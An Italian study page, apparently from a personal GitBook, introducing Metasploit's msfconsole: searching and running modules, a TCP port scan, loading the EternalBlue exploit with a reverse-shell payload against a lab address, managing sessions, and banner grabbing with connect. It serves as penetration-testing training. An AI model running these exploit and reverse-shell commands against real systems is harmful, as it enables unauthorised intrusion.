# MSFconsole Fundamentals

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2248).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2249).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2250).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2251).png" alt=""><figcaption></figcaption></figure>

***

```
msfconsole
help
version
show all //mostra tutti i moduli
show exploits
show -h //aggiungiamo -h per help a qualsiasi comando
search portscan //per cercare un modulo con portscan
use auxiliary/scanner/portscan/tcp
show options
//Set variables
set RHOSTS 192.168.2.1
set PORTS 1-1000
run
back //o exit, per uscire dal modulo usato
search cve:2017 type:exploit platform:windows //per filtrare tramite CVE e filtri vari

```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2252).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2253).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2254).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2255).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2257).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2258).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2259).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2260).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2261).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2262).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2263).png" alt=""><figcaption></figcaption></figure>

## Moduli con payload

```
search eternalblue
use 0
show options
set payload ... //se necessario cambiarlo da 64 a 32bit ad esempio, o diverso OS
set RHOSTS 192.168.2.1
set LHOST //se necessario cambiarla per la reverse shell
set LPORT //se necessario, magari la porta è già occupata
exploit
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2264).png" alt=""><figcaption></figcaption></figure>

In alcuni casi potrebbe essere necessario modificare il payload da 32 a 64 bit o da windows a linux

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2265).png" alt=""><figcaption></figcaption></figure>

Per cambiare il payload possiamo usare il comando set paylod e poi specificando il tipo di payload:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2266).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2267).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2268).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2269).png" alt=""><figcaption></figcaption></figure>

## Gestire le sessioni

```
sessions
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2270).png" alt=""><figcaption></figcaption></figure>

## Funzionalità aggiuntive

### Connect

```
connect -h
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2271).png" alt=""><figcaption></figcaption></figure>

Possibilità di fare connessioni tipo con netcat, in sostanza ci permette di fare **banner grabbing**

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (2272).png" alt=""><figcaption></figcaption></figure>

Ci dice la porta che è stata usata per connettersi dall'attacker IP, e in caso di alcuni servizi ci mostra il banner relativo.

